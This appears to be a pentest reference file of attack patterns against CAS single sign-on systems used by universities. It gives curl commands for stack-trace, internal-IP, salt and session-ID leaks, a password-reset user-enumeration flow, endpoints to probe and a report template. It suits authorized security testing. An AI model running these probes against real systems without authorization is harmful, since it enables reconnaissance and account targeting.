# CAS/Apereo System Vulnerability Testing Patterns

> **ycServer/金智教育 CAS**: 如果目标使用 ycServer (主题路径 `/authserver/{school}Theme{N}/`)，
> 参见 `references/ycserver-cas-testing-patterns.md` 获取产品特定的攻击模式。
>
> **lyuapServer/联创天空 CAS**: 如果目标使用 lyuapServer (路径 `/lyuapServer/`, React SPA前端, `ly-gateway-server-svc`)，
> 参见 `references/cas-lyuapserver-testing-patterns.md` 获取用户枚举和密码错误计数泄露的攻击模式。

## System Fingerprint
- Login page title: "统一身份认证及授权访问平台" or "CAS"
- URL pattern: /cas/login, /authserver/login
- Cookie: JSESSIONID
- Hidden form field: `lt` (login ticket)

## Critical Finding: /cas/status Stack Trace Leak
```bash
curl -sk "https://target/cas/status"
```
Returns HTTP 500 with full Java stack trace including:
- **Server version**: `Apache Tomcat/8.5.58` (in `<h3>` footer)
- **Framework**: Spring Security (IpAddressMatcher, WebSecurityExpressionRoot)
- **Internal config**: `Failed to parse address127.0.0.1:8443` (internal port)
- **Class paths**: org.springframework.security.*, com.github.inspektr.*

**Why this works**: The /cas/status endpoint triggers a Spring Security evaluation that fails on malformed IP address parsing, causing an unhandled exception that leaks the full stack trace.

## Critical Finding: /cas/login Internal IP Leak
```bash
curl -sk "https://target/cas/login" | grep -oP "loginTicket = '[^']*'"
```
The loginTicket variable contains the internal CAS server address:
```
var loginTicket = 'LT-xxx-http://INTERNAL_IP:PORT/cas';
```
Example: `LT-1436123-el6LShTn5hhy4db6kebzwdtzoWmdna-http://202.202.208.224:8080/cas`

The internal IP is embedded in the ticket format: `LT-{number}-{hash}-http://{INTERNAL_IP}:{PORT}/cas`

## Critical Finding: pwdDefaultEncryptSalt Leak (密码加密盐值泄露)
```bash
curl -sk "https://target/authserver/login" | grep -i "pwdDefaultEncryptSalt"
```
Returns the AES encryption salt used for password encryption:
```javascript
var pwdDefaultEncryptSalt = "yCXPX7ZB4k1hjotP";
<input type="hidden" id="pwdDefaultEncryptSalt" value="yCXPX7ZB4k1hjotP"/>
```
**Impact**: The salt rotates per session, but exposes the encryption mechanism. Combined with MITM, it can decrypt passwords. The CAS uses CryptoJS AES encryption with this salt.

**Detection**: Also check `/authserver/custom/js/encrypt.js` for the CryptoJS implementation.

## Critical Finding: JSESSIONID URL Leak (会话ID泄露)
```bash
curl -sk "https://target/authserver/login" | grep -i "jsessionid"
```
JSESSIONID exposed in static resource URLs:
```html
<link href="/authserver/custom/css/login.css;jsessionid=J0L6qNLCbppCJ6pYPytbNwhKl5vV8pCJwqmCP2LT0dyKq0J2pdqQ!-412918561" rel="stylesheet">
<img src="/authserver/custom/images/login-bg-autumn.png;jsessionid=J0L6qNLCbppCJ6pYPytbNwhKl5vV8pCJwqmCP2LT0dyKq0J2pdqQ!-412918561">
```
**Impact**: JSESSIONID in URLs can be leaked via Referer headers, browser history, proxy logs. Attackers can hijack sessions. Violates OWASP session management best practices.

## Critical Finding: Password Reset User Enumeration (密码重置用户枚举)
CAS password reset at `/authserver/getBackPasswordMainPage.do` supports:
- Phone recovery (type=mobile)
- Email recovery (type=mail)
- Security question recovery (type=question)

**User enumeration via error codes**:
```bash
# Step 1: Submit password reset request
curl -sk -X POST "https://target/authserver/getBackPassword.do" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "userId=VALID_USER&mobile=13800138000&captcha=REQUIRED&type=mobile&step=1"
# Returns: {"code":2,"message":"手机号错误"} (code 2 = valid user, wrong phone)

curl -sk -X POST "https://target/authserver/getBackPassword.do" \
  -d "userId=INVALID_USER&mobile=13800138000&captcha=REQUIRED&type=mobile&step=1"
# Returns: {"code":1,"message":"用户名错误"} (code 1 = invalid user)
```

**Error code mapping**:
- code=1: 用户名错误 (invalid username)
- code=2: 手机号错误 (valid user, wrong phone) ★ user confirmed
- code=3: 验证码错误 (valid user+phone, wrong captcha)
- code=4: 邮箱格式错误
- code=8: 邮箱错误 (valid user, wrong email) ★ user confirmed

**Attack flow**: Enumerate valid usernames by observing different error codes. Requires solving captcha first.

## CAS API Endpoints
```bash
# Service validation (returns XML error if no ticket)
curl -sk "https://target/cas/serviceValidate?service=https://target/cas/login&ticket=ST-12345"
# Returns: <cas:authenticationFailure code='INVALID_TICKET'>

# P3 service validation
curl -sk "https://target/cas/p3/serviceValidate?service=https://target&ticket=ST-12345"

# Logout
curl -sk "https://target/cas/logout"
```

## Actuator Endpoints (Usually Redirect to Login)
```bash
# These typically 302 redirect to /cas/login
for path in /cas/actuator /cas/actuator/env /cas/actuator/health /cas/actuator/info; do
    curl -sk -o /dev/null -w "%{http_code}" "https://target${path}"
done
```

## Other CAS Paths to Test
```bash
/cas/v1/tickets          # REST API (usually empty)
/cas/v1/users            # User API
/cas/health              # Health check
/cas/info                # Info endpoint
```

## Report Pattern
**Title**: "xxx学校CAS统一身份认证系统信息泄露漏洞"
**Type**: 信息泄露
**Level**: 低危 (info leak only) / 中危 (if combined with other vulns)
**CVSS**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N → 5.3

**Key points to include in report:**
1. /cas/status leaks Tomcat version + Spring Security framework + stack trace
2. /cas/login leaks internal IP in loginTicket variable
3. Combined: attacker can identify server architecture for targeted attacks

## Related: Coremail Detection
```bash
# Coremail login page
curl -sk "https://mail.target/coremail/s?func=user:login"
# Returns XML: <?xml version="1.0" encoding="UTF-8"?><result><code>UID.IS.EMPTY</code></result>

# Coremail admin endpoints (require session)
curl -sk "https://mail.target/coremail/s?func=admin:appState"
curl -sk "https://mail.target/coremail/s?func=admin:getServerInfo"
# Returns: <?xml version="1.0"?>...<code>FA_INVALID_SESSION</code>...
```
